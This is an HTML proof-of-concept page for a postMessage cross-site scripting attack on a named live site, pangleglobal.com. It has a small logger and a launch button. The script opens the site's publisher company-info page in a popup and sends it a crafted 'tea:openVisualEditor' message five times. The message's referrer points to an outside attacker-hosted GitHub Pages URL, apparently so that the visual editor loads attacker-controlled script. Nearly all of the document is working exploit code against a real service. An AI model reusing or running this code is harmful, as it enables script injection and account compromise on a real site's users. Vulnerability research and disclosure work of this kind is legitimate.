<html>
<body>
<h2>postMessage XSS PoC — pangleglobal.com</h2>
<p id="status">Click button to start PoC</p>
<div id="log" style="font-family:monospace;margin-top:10px"></div>
<button onclick="startPoC()" style="padding:10px 20px;font-size:16px">
  🚀 Launch PoC
</button>
<script>
const ATTACKER = 'https://telojos11.github.io/cekcek';

function log(msg) {
  document.getElementById('log').innerHTML += '<br>' + msg;
  console.log(msg);
}

function startPoC() {
  log('Step 1: Opening target...');
  
  const target = window.open(
    'https://www.pangleglobal.com/publisher/companyInfo', 
    '_blank'
  );
  
  if (!target) {
    log('❌ Popup blocked!');
    return;
  }

  // Kirim berkali-kali dengan interval untuk pastikan Tea SDK sudah load
  let attempts = 0;
  const interval = setInterval(() => {
    attempts++;
    log(`Attempt ${attempts}: sending payload...`);
    
    try {
      target.postMessage(JSON.stringify({
        type: 'tea:openVisualEditor',
        payload: { referrer: ATTACKER }
      }), '*');
    } catch(e) {
      log('Error: ' + e.message);
    }
    
    if (attempts >= 5) {
      clearInterval(interval);
      log('✅ All attempts done. Check target window.');
    }
  }, 2000); // kirim setiap 2 detik, 5x = 10 detik total
}
</script>
</body>
</html>
